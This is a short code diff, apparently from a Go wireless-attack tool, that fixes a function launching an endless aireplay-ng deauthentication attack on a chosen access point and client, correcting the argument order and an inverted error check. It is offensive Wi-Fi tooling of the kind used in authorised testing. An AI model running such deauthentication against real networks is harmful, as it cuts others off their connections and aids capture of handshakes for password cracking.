@@ -170,7 +170,7 @@ func (a *AP) Capture(iface string) (attacks.Attack, captures.Capture, error) {
 
 // DEAUTH infinitely the Client
 func (c *Client) Deauth(iface string) (attacks.Attack, error) {
-	cmd := exec.Command("aireplay-ng", "-0", "0", "-a", c.Station, "-d", c.Bssid, iface)
+	cmd := exec.Command("aireplay-ng", "-0", "0", "-a", c.Bssid, "-c", c.Station, iface)
 
 	err := cmd.Start() // Do not wait
 
@@ -181,7 +181,7 @@ func (c *Client) Deauth(iface string) (attacks.Attack, error) {
 		Started: time.Now().String(),
 	}
 
-	if err != nil {
+	if err == nil {
 		cur_atk.Running = true
 		cur_atk.Init(cmd.Process)
 	}
